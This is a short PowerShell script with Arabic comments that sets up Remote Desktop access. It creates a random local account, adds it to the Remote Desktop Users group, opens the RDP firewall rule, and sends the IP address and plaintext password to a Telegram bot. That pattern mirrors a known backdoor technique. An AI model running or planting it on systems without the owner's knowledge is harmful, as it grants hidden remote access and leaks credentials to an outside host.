# وظيفة لإنشاء اسم مستخدم عشوائي
function Generate-RandomUsername {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    $username = -join ((1..8 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] }))
    return $username
}

# وظيفة لإنشاء كلمة مرور عشوائية
function Generate-RandomPassword {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    $password = -join ((1..12 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] }))
    return $password
}

# توليد بيانات تسجيل الدخول
$UserName = Generate-RandomUsername
$Password = Generate-RandomPassword

# تعيين كلمة مرور للمستخدم
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$UserCredential = New-Object System.Management.Automation.PSCredential ($UserName, $SecurePassword)

# إنشاء المستخدم وإضافته إلى مجموعة Remote Desktop Users
net user $UserName $Password /add
net localgroup "Remote Desktop Users" $UserName /add

# تمكين الوصول عن بُعد
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# الحصول على عنوان IP المحلي
$IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }).IPAddress

# عرض المعلومات
Write-Host "تم إعداد خادم RDP بنجاح."
Write-Host "عنوان IP: $IPAddress"
Write-Host "اسم المستخدم: $UserName"
Write-Host "كلمة المرور: $Password"

# إرسال المعلومات عبر Telegram (اختياري)
function Send-TelegramMessage {
    param (
        [string]$botToken,
        [string]$chatId,
        [string]$message
    )
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{
        chat_id = $chatId
        text    = $message
    }
    Invoke-RestMethod -Uri $url -Method Post -Body $body
}

# إعداد معلومات بوت Telegram من متغيرات بيئية
$botToken = $env:TELEGRAM_BOT_TOKEN
$chatId = $env:TELEGRAM_CHAT_ID

# إعداد الرسالة
$message = "تم إعداد خادم RDP بنجاح.`nعنوان IP: $IPAddress`nاسم المستخدم: $UserName`nكلمة المرور: $Password"

# إرسال الرسالة عبر Telegram
Send-TelegramMessage -botToken $botToken -chatId $chatId -message $message
